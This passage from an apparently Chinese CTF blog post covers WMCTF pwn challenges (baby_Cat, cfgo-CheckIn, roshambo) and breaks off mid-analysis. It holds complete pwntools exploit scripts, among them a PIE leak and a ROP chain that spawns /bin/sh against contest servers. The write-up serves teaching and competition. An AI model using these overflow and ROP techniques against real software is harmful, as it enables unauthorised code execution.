class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Program.MsgHandler msgHandler = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Right);</span><br><span class="line">Program.MsgHandler msgHandler2 = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Backdoor);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">unsafe</span> <span class="keyword">void</span> <span class="title">Right</span>(<span class="params"><span class="keyword">char</span>* args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(args[i]);</span><br><span class="line">&#125;</span><br><span class="line">Console.Write(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">unsafe</span> <span class="keyword">void</span> <span class="title">Backdoor</span>(<span class="params"><span class="keyword">char</span>* args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"I'll give you flag!"</span>);</span><br><span class="line"><span class="keyword">string</span> str = <span class="string">"type C:\\flag.txt"</span>;</span><br><span class="line">Process process = <span class="keyword">new</span> Process();</span><br><span class="line">process.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line">process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">process.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">process.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">process.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">process.Start();</span><br><span class="line">process.StandardInput.WriteLine(str + <span class="string">"&amp;exit"</span>);</span><br><span class="line">process.StandardInput.AutoFlush = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">string</span> <span class="keyword">value</span> = process.StandardOutput.ReadToEnd();</span><br><span class="line">process.WaitForExit();</span><br><span class="line">process.Kill();</span><br><span class="line">Console.WriteLine(<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，只要让程序流走到<code>msgHandler2</code>的位置也就是<code>Backdoor</code>，就能拿到flag了。</p></li><li><p>于是只要利用输入覆盖<code>ptr[50]</code>也就是<code>index</code>，使其指向内存中<code>&amp;num - 1</code>，那么下一次就能覆盖<code>num = 0</code>，从而执行<code>Backdoor</code>。</p></li><li><p>而找到<code>ptr</code>到<code>&amp;num</code>的偏移，这里需要借助动态调试，利用dnSpy attach到baby_Cat.exe进程，直接查看内存计算偏移：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803100103848.png" alt="image-20200803100103848"></p><p><code>31 00 31 00...</code>即<code>ptr</code>的位置，<code>01 00 00 00</code>即<code>num</code>的位置，从而得到偏移为<code>(0x337F1F0 - 0x337F118) / 2 - 1 = 0x6B</code>。</p></li><li><p>因此只要构造覆盖<code>ptr[50]</code>为<code>0x6C</code>，然后再输入<code>\x00</code>，即可执行到<code>Backdoor</code>，获得flag：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803100552439.png" alt="image-20200803100552439"></p></li><li><p>exp</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.73.46.229'</span>, <span class="number">51000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">50</span> + chr(<span class="number">0x6b</span>) + <span class="string">'\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="cfgo-CheckIn"><a href="#cfgo-CheckIn" class="headerlink" title="cfgo-CheckIn"></a>cfgo-CheckIn</h1><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先binary是upx加壳的，直接<code>upx -d cfgo-checkin</code>拿到脱壳后的程序拖到IDA分析，发现是个go，尝试用<a href="https://github.com/sibears/IDAGolangHelper" target="_blank" rel="noopener">IDAGoHelper</a>恢复符号表，但恢复出来跟没恢复一样；那就直接跑看看：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803102049715.png" alt="image-20200803102049715"></p></li><li><p>100个迷宫，直接写个脚本去解，因为开始做题并没有去逆向binary，而是直接通过收到的字符串判断起点和终点的符号，这里有个坑，就是代表起点和终点的字符是变化的，并不是某个特定的字符，由于是4 bytes编码的字符，其后两位都可能变化。</p></li><li><p>解出100个迷宫之后，可以输入一串字符串：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803102727298.png" alt="image-20200803102727298"></p><p>本能地输入很长的字符串之后，程序就crash了，打印出了crash的路径，这里其实也可以看到，之前说的恢复符号表依然是乱七八糟的字符，其实是正确的，从这个crash的函数也可以看出来，从而可以辅助定位关键函数的位置。</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803102821970.png" alt="image-20200803102821970"></p></li><li><p>后面的基本就靠猜了，首先这个crash是由于<code>malloc</code>的size过大而造成的，可以推断出stack上储存了size的临时变量，那么只要在overflow的时候尽量不破坏其他有效的变量信息，而是直接覆盖return address，就能控制程序流了。</p></li><li><p>后面经过不断地试错尝试，以及根据crash的信息辅助推断，最后确定return address的<code>offset = 0x110</code>；</p><p>以及在<code>offset = 0x70</code>的位置储存的是一个指针，后续程序复读输入的字符串就是用的这个指针输出；同时size信息储存在<code>offset = 0x78</code>的位置，只要给一个合理的值即可。</p></li><li><p>至此，还有一个问题就是，程序开了PIE，需要leak PIE，根据前一步说的，控制<code>offset = 0x70</code>就可以leak 内存中的数据。于是，根据binary的特性，可以看到stack始终是在<code>0xc000000000</code>开始的这段内存中，其中<code>0xc000000030</code>正好储存着binary代码段的地址，因此PIE可以leak了</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803104741362.png" alt="image-20200803104741362"></p></li><li><p>leak完PIE之后，显然需要继续执行binary才能达到溢出的目的，所以需要覆盖return address实现二次执行的目的，而因为这个时候并没有leak出PIE地址，所以只能通过partial overwrite的方式覆盖ret address的最后一个bytes。其实这时可以通过查找字符串需要主逻辑的地址，也就是”Leave your name:”，这里有个坑就是IDA直接搜字符串搜不到，可能因为没有解析到，通过二进制搜索可以定位到字符串的地址为`0x11EECE：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105024815.png" alt="image-20200803105024815"></p><p>根据引用找到关键函数<code>nArxBHup</code>，这里就是输出”Leave your name:”，然后接受输入，最后再复读的逻辑    </p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105249837.png" alt="image-20200803105249837"></p><p>而比较幸运的是：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105414333.png" alt="image-20200803105414333"></p><p>这里有个<code>call nArxBHup</code>的逻辑，而且正好只需要改掉地址最后一个byte为<code>\xCE</code>即可，那么这样就能再次利用栈溢出实现后续getshell的rop了</p></li><li><p>因此，总结一下，第一次利用<code>offset = 0x70</code>处的指针leak PIE，并且partial write return address返回到<code>nArxBHup</code>从而提供再次利用栈溢出的机会；第二次直接在return address布置rop getshell：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803105643166.png" alt="image-20200803105643166"></p></li><li><p>exp</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'81.68.174.63'</span>, <span class="number">62176</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_to_maze</span><span class="params">(input)</span>:</span></span><br><span class="line">    strings = input.split(<span class="string">'\n'</span>)</span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    maze = []</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> strings:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        col = <span class="number">0</span></span><br><span class="line">        maze_row = []</span><br><span class="line">        <span class="keyword">while</span> i &lt; len(string):</span><br><span class="line">            <span class="keyword">if</span> string[i:].startswith(<span class="string">'\xf0\x9f\x98'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x99'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x90'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x8D'</span>):</span><br><span class="line">                start = [row, col]</span><br><span class="line">                maze_row.append(<span class="number">1</span>)</span><br><span class="line">                i += <span class="number">4</span></span><br><span class="line">            <span class="keyword">elif</span> string[i:].startswith(<span class="string">'\xf0\x9f\x9a'</span>)\</span><br><span class="line">            <span class="keyword">or</span> string[i:].startswith(<span class="string">'\xf0\x9f\x99'</span>):</span><br><span class="line">                end = [row, col]</span><br><span class="line">                maze_row.append(<span class="number">1</span>)</span><br><span class="line">                i += <span class="number">4</span></span><br><span class="line">            <span class="keyword">elif</span> string[i:].startswith(<span class="string">'\xe2\xac\x9b'</span>):</span><br><span class="line">                maze_row.append(<span class="number">0</span>)</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> string[i:].startswith(<span class="string">'\xe2\xac\x9c'</span>):</span><br><span class="line">                maze_row.append(<span class="number">1</span>)</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> len(string[i:]) &lt; <span class="number">3</span>:</span><br><span class="line">                maze_row.append(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(string[i:i+<span class="number">4</span>].encode(<span class="string">'hex'</span>))</span><br><span class="line">                print(<span class="string">"error input"</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            col += <span class="number">1</span></span><br><span class="line">        maze.append(maze_row)</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start, maze, end</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_maze</span><span class="params">(level)</span>:</span></span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    input_maze = <span class="string">""</span></span><br><span class="line">    times = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> times &lt;= level + <span class="number">5</span>:</span><br><span class="line">        string_get = p.recvline()</span><br><span class="line">        input_maze += string_get</span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(input_maze)</span></span><br><span class="line"></span><br><span class="line">    start, maze, end = convert_to_maze(input_maze)</span><br><span class="line"></span><br><span class="line">    sol = []</span><br><span class="line">    <span class="keyword">if</span> mov(start[<span class="number">0</span>], start[<span class="number">1</span>], maze, end, sol) == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">"No solution"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">''</span>.join(sol[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span><span class="params">(row, col, maze, end, sol)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> row == end[<span class="number">0</span>] <span class="keyword">and</span> col == end[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    maze[row][col] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    row_size = len(maze)</span><br><span class="line">    col_size = len(maze[row])</span><br><span class="line">    <span class="keyword">if</span> col &lt; col_size <span class="keyword">and</span> row + <span class="number">1</span> &lt; row_size <span class="keyword">and</span> maze[row + <span class="number">1</span>][col] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row + <span class="number">1</span>, col, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'s'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> col &lt; col_size <span class="keyword">and</span> row - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> maze[row - <span class="number">1</span>][col] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row - <span class="number">1</span>, col, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'w'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> col + <span class="number">1</span> &lt; col_size <span class="keyword">and</span> maze[row][col + <span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row, col + <span class="number">1</span>, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'d'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> col - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> maze[row][col - <span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> mov(row, col - <span class="number">1</span>, maze, end, sol) == <span class="literal">True</span>:</span><br><span class="line">            sol.append(<span class="string">'a'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    maze[row][col] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    solve_maze(i)</span><br><span class="line">    print(<span class="string">"Done "</span> + str(i))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ret_address = <span class="number">0x158</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">112</span> + p64(<span class="number">0xc000000030</span>) + p64(<span class="number">0x40</span>) + <span class="string">'A'</span> * <span class="number">0x90</span> + <span class="string">'\xCE'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Your name is : '</span>)</span><br><span class="line">PIE_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x206ac0</span></span><br><span class="line"></span><br><span class="line">pop_rsp = <span class="number">0x000000000008872e</span> <span class="comment"># pop rsp ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000109d3d</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000119c45</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000074e29</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">syscall = <span class="number">0x00000000000743c9</span> <span class="comment"># syscall</span></span><br><span class="line">input_addr = <span class="number">0x000000c00003edf8</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">112</span> + p64(<span class="number">0xc000000030</span>) + p64(<span class="number">0x40</span>) + <span class="string">'A'</span> * <span class="number">0x90</span></span><br><span class="line">payload += flat([PIE_base + pop_rax, <span class="number">0x3b</span>])</span><br><span class="line">payload += flat([PIE_base + pop_rdi, <span class="number">0x000000c000044ec8</span>])</span><br><span class="line">payload += flat([PIE_base + pop_rsi, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([PIE_base + syscall])</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"PIE_base: "</span> + hex(PIE_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="roshambo"><a href="#roshambo" class="headerlink" title="roshambo"></a>roshambo</h1><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先这个看起来挺复杂，其实仔细分析一下，可以理解为一个简单的游戏对战客户端，其中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_buffer();</span><br><span class="line">  hook_exit();</span><br><span class="line">  create_file();</span><br><span class="line">  open_file();</span><br><span class="line">  sandbox();</span><br><span class="line">  recv_client();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to WMCTF!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Roshambo is a good game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Have fun!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    client();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code>函数下，关注<code>recv_client</code>和<code>client</code>这两个函数，分别对应两个线程，一个是接受另一个客户端的消息并作出相应的动作，一个是本地客户端，用来向其他客户端发出动作，至于如何实现的客户端也就是进程间的通信，程序采用的是管道的方式，也就是通过<code>mkfifo</code>，经过文件实现进程间的通信：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1E55</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_input() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"pipe filename is wrong!"</span>);</span><br><span class="line">    quit();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcat</span>(file, <span class="string">"/tmp/"</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(file, sha256_auth);</span><br><span class="line">  <span class="built_in">strcat</span>(name, file);</span><br><span class="line">  <span class="built_in">strcat</span>(name, <span class="string">"_GUEST"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( access(file, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    file_fifo = mkfifo(file, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( file_fifo )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"Could not create fifo!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x17</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( access(name, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    file_fifo = mkfifo(name, <span class="number">0x1FF</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( file_fifo )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"Could not create fifo!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x17</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  file_file[<span class="number">0</span>] = <span class="built_in">open</span>(file, <span class="number">1</span>);</span><br><span class="line">  result = <span class="built_in">open</span>(name, <span class="number">0</span>);</span><br><span class="line">  name_file = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个函数逻辑只有在Mode C的情况下（程序提供两种模式：C &amp; L）才会调用，也就是说必须有一个C和一个L才能互相通信，而文件名是Mode C下通过对输入的<code>Authentication</code>进行<code>sha256</code>计算得到的，所以另一个Mode L只要通过在输入<code>room</code>时输入这个sha256值就能建立起连接。</p><p>至于交互的细节，可以在<code>recv_client</code>中看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+20h] [rbp-1000h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+48h] [rbp-FD8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( !mode_is_L || mode_is_L == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(file_file[mode_is_L == <span class="number">0</span>], &amp;s, <span class="number">0x38</span>uLL);</span><br><span class="line">    <span class="built_in">read</span>(file_file[mode_is_L == <span class="number">0</span>], &amp;v4, nbytes);</span><br><span class="line">    v1 = cmp_with__RPC_(&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      play_game((__int64)&amp;s);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  quit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类比成一个最长为0x1000 bytes的数据包，格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+----------+--------+----------+</span><br><span class="line">|    8   |   8    |     8    |   32   | name_len |</span><br><span class="line">+--------+--------+----------+--------+----------+</span><br><span class="line">| status | option | name_len | sha256 |   name   |</span><br><span class="line">+--------+--------+----------+--------+----------+</span><br><span class="line"></span><br><span class="line">status： &quot;[RPC]&quot;  or  &quot;EXIT&quot;</span><br><span class="line">option:  [1 - 8]</span><br></pre></td></tr></table></figure><p>只有在<code>status</code>为”[RPC]”，另一个client才会做出相应的动作，而至于<code>name_Len</code>开始的位置，后续基本没有用到，可以不用管；对于<code>option</code>，关注<code>client</code>函数中的相应逻辑，重点关注<code>case 8</code>：</p><figure class="highlight 